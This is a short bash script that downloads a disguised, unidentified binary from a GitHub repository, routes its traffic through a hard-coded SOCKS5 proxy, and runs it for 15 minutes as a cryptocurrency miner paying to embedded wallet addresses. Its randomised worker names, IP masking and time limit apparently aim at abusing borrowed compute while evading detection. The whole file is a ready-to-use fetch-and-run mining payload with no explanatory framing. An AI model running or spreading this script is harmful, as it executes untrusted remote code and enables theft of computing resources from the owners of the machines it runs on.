#!/bin/bash
#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
apt install libpci3
apt install curl
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
export http_proxy=socks5://65.2.123.108:9001
curl -x "socks5://65.2.123.108:9001" ifconfig.co
timeout 15m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
